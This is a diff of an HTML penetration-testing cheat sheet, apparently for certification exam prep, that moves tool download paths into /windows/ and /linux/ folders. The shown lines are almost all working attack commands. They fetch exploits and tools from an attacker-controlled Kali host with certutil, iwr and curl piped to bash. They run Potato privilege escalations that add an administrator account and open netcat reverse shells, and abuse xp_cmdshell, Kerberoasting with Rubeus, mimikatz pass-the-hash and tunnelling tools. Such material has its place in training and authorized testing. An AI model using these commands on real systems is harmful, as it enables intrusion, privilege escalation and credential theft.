@@ -2072,7 +2072,7 @@ GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → J
 <div class="subsection"><div class="subsection-title">SharpEfsPotato — EFS RPC Abuse (patched systems)</div>
 <div class="callout callout-tip"><strong>💡 Works on many fully-patched systems</strong> — abuses the EFS RPC interface, no DCOM/OXID relay needed.</div>
 <div class="cmd-label">TRANSFER</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/SharpEfsPotato.exe {{WPATH}}\sep.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/SharpEfsPotato.exe {{WPATH}}\sep.exe</pre></div>
 <div class="cmd-label">ADD ADMIN</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\sep.exe "cmd /c net user pwned Password123! /add &amp;&amp; net localgroup Administrators pwned /add"</pre></div>
 <div class="cmd-label">REV SHELL</div>
@@ -2082,7 +2082,7 @@ GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → J
 <div class="subsection"><div class="subsection-title">EfsPotato <span style="background:#4a3500;color:#e3b341;font-size:10px;padding:1px 5px;border-radius:3px;font-weight:700;margin-left:6px">COMPILE ON TARGET</span> — Source-only, needs csc.exe</div>
 <div class="callout callout-warn"><strong>⚠️ Source code only</strong> — Transfer the .cs source and compile on the target using the built-in .NET compiler. Requires .NET Framework 4.x on target.</div>
 <div class="cmd-label">TRANSFER .cs source</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/EfsPotato.cs {{WPATH}}\EfsPotato.cs</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/EfsPotato.cs {{WPATH}}\EfsPotato.cs</pre></div>
 <div class="cmd-label">COMPILE with csc.exe (no external deps)</div>
 <div class="cmd-wrap"><pre class="cmd">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:{{WPATH}}\ep.exe {{WPATH}}\EfsPotato.cs -nowarn:1691,618</pre></div>
 <div class="cmd-label">ADD ADMIN</div>
@@ -2094,7 +2094,7 @@ GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → J
 <div class="subsection"><div class="subsection-title">HotPotato (CVE-2016-3225 — Win7 / Server 2008 R2 only)</div>
 <div class="callout callout-warn"><strong>⚠️ Legacy only</strong> — Works on Win7, Server 2008 R2. Does NOT work on Win10/Server 2019+. Uses NBNS spoofing + NTLM relay + WPAD.</div>
 <div class="cmd-label">TRANSFER</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/HotPotato.exe {{WPATH}}\hp.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/HotPotato.exe {{WPATH}}\hp.exe</pre></div>
 <div class="cmd-label">REV SHELL</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\hp.exe -ip 127.0.0.1 -disable_exhaust true -cmd "{{WPATH}}\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"</pre></div>
 <div class="cmd-label">ADD ADMIN</div>
@@ -2104,7 +2104,7 @@ GodPotato → PrintSpoofer → SweetPotato → SigmaPotato → RoguePotato → J
 <div class="subsection"><div class="subsection-title">Churrasco (Windows XP / 2003 / Vista — very old systems)</div>
 <div class="callout callout-warn"><strong>⚠️ Very old systems only</strong> — Windows XP SP3, Server 2003. Uses named pipe impersonation (no DCOM). Use when JuicyPotato/GodPotato don't work.</div>
 <div class="cmd-label">TRANSFER</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Churrasco.exe {{WPATH}}\churrasco.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/churrasco.exe {{WPATH}}\churrasco.exe</pre></div>
 <div class="cmd-label">TEST</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\churrasco.exe "whoami"</pre></div>
 <div class="cmd-label">REV SHELL</div>
@@ -2838,7 +2838,7 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePat
 <div class="cmd-wrap"><pre class="cmd">john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">Kerberoasting — from Windows (Rubeus)</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Rubeus.exe {{WPATH}}\Rubeus.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/Rubeus.exe {{WPATH}}\Rubeus.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /outFile:{{WPATH}}\roasted.txt</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /format:hashcat /outFile:{{WPATH}}\roasted.txt</pre></div>
 </div>
@@ -2960,8 +2960,8 @@ Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match "{{
 # Look for GenericAll/GenericWrite edges on computer nodes</pre>
   </div>
   <div class="pipe-step pipe-kali"><div class="pipe-step-label">TRANSFER tools</div>
-    <pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Whisker.exe {{WPATH}}\Whisker.exe
-certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Rubeus.exe {{WPATH}}\Rubeus.exe</pre>
+    <pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/Whisker.exe {{WPATH}}\Whisker.exe
+certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/Rubeus.exe {{WPATH}}\Rubeus.exe</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">2. EXPLOIT — add shadow credentials via Whisker</div>
     <pre class="cmd"># Add shadow credential (generates certificate + password)
@@ -3042,7 +3042,7 @@ EXEC xp_cmdshell 'whoami';
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — OS command execution → reverse shell</span>
 <div class="cmd-wrap"><div class="cmd-label">Drop reverse shell via xp_cmdshell</div>
-<pre class="cmd">EXEC xp_cmdshell 'powershell -c "iwr http://{{KALI_IP}}:{{PORT}}/nc64.exe -o C:\Windows\Temp\nc.exe"';
+<pre class="cmd">EXEC xp_cmdshell 'powershell -c "iwr http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -o C:\Windows\Temp\nc.exe"';
 EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe {{KALI_IP}} {{RPORT}} -e cmd.exe';</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">If not sysadmin — capture NTLMv2 hash via xp_dirtree (no xp_cmdshell needed)</div>
 <pre class="cmd">-- On Kali: responder -I eth0 -wrf
@@ -3207,7 +3207,7 @@ curl -s -k -u admin:PASSWORD -X PUT https://localhost:8443/api/v1/scripts/ext/sc
 {{WPATH}}\chisel.exe client {{KALI_IP}}:8081 R:8443:127.0.0.1:8443</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">plink.exe alternative (PuTTY)</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/plink.exe {{WPATH}}\plink.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/plink.exe {{WPATH}}\plink.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd">echo y | {{WPATH}}\plink.exe -ssh -l root -pw {{PASS}} -R 0.0.0.0:{{RPORT}}:127.0.0.1:{{RPORT}} {{KALI_IP}}</pre></div>
 </div>
 <div class="notes-toggle" onclick="toggleNotes('win-chisel')">&#128221; Notes</div>
@@ -3223,8 +3223,8 @@ curl -s -k -u admin:PASSWORD -X PUT https://localhost:8443/api/v1/scripts/ext/sc
 </div>
 <div class="subsection"><div class="subsection-title">winPEAS — Full Windows Enum</div>
 <div class="cmd-label">TRANSFER &amp; RUN</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/winPEASx64.exe {{WPATH}}\wp.exe &amp;&amp; {{WPATH}}\wp.exe</pre></div>
-<div class="cmd-wrap"><pre class="cmd">iwr http://{{KALI_IP}}:{{PORT}}/winPEASx64.exe -OutFile {{WPATH}}\wp.exe; {{WPATH}}\wp.exe | Tee-Object {{WPATH}}\wp_out.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/winPEASx64.exe {{WPATH}}\wp.exe &amp;&amp; {{WPATH}}\wp.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">iwr http://{{KALI_IP}}:{{PORT}}/windows/winPEASx64.exe -OutFile {{WPATH}}\wp.exe; {{WPATH}}\wp.exe | Tee-Object {{WPATH}}\wp_out.txt</pre></div>
 <div class="callout callout-warn"><strong>🎨 winPEAS Color Guide — Critical for exam speed:</strong>
 <ul style="margin:6px 0 0 16px;line-height:1.8">
 <li><span style="color:#f85149;font-weight:700">RED</span> = Critical finding — high-confidence privesc vector. Check IMMEDIATELY.</li>
@@ -3266,7 +3266,7 @@ net use Z: /delete                                # Unmount</pre></div>
 sudo umount /mnt/smb</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">Seatbelt — Host Survey</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Seatbelt.exe {{WPATH}}\sb.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/Seatbelt.exe {{WPATH}}\sb.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\sb.exe -group=system</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\sb.exe -group=all 2&gt;&amp;1 | Tee-Object {{WPATH}}\sb_out.txt</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\sb.exe TokenPrivileges WindowsDefender McAfeeSiteAdvisor AV Processes</pre></div>
@@ -3284,7 +3284,7 @@ sudo umount /mnt/smb</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\mimi.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:{{DOMAIN}} /ntlm:NTLM_HASH /run:cmd.exe" exit</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">Rubeus — Kerberos Attack Workflow</div>
-<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/Rubeus.exe {{WPATH}}\Rubeus.exe</pre></div>
+<div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/Rubeus.exe {{WPATH}}\Rubeus.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe kerberoast /format:hashcat /outFile:{{WPATH}}\roast.txt</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe asreproast /format:hashcat /outFile:{{WPATH}}\asrep.txt</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Rubeus.exe dump /service:krbtgt /nowrap</pre></div>
@@ -5756,12 +5756,12 @@ proxychains curl http://INTERNAL_IP/
 proxychains evil-winrm -i INTERNAL_IP -u {{USER}} -p {{PASS}}</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">linPEAS — interpret output</div>
-<div class="cmd-wrap"><pre class="cmd">curl -sL http://{{KALI_IP}}:{{PORT}}/linpeas.sh | bash 2&gt;&amp;1 | tee /tmp/lp.txt</pre></div>
-<div class="cmd-wrap"><pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linpeas.sh -O /tmp/lp.sh &amp;&amp; chmod +x /tmp/lp.sh &amp;&amp; /tmp/lp.sh -a</pre></div>
+<div class="cmd-wrap"><pre class="cmd">curl -sL http://{{KALI_IP}}:{{PORT}}/linux/linpeas.sh | bash 2&gt;&amp;1 | tee /tmp/lp.txt</pre></div>
+<div class="cmd-wrap"><pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/linpeas.sh -O /tmp/lp.sh &amp;&amp; chmod +x /tmp/lp.sh &amp;&amp; /tmp/lp.sh -a</pre></div>
 <div class="callout callout-tip"><strong>💡 Key linPEAS sections:</strong> Look for <span style="color:var(--red);font-weight:700">RED/YELLOW</span> items. Focus on: SUID binaries, sudo -l, writable /etc/passwd, cron jobs, capabilities, interesting files, passwords in configs. The "95% PE vector" line tells you the most likely path.</div>
 </div>
 <div class="subsection"><div class="subsection-title">pspy — monitor processes without root</div>
-<div class="cmd-wrap"><pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/pspy64 -O /tmp/pspy &amp;&amp; chmod +x /tmp/pspy</pre></div>
+<div class="cmd-wrap"><pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/pspy64 -O /tmp/pspy &amp;&amp; chmod +x /tmp/pspy</pre></div>
 <div class="cmd-wrap"><pre class="cmd">/tmp/pspy -pf -i 1000
 # Watch for: cron jobs running as root, unusual process spawns, file access patterns</pre></div>
 </div>
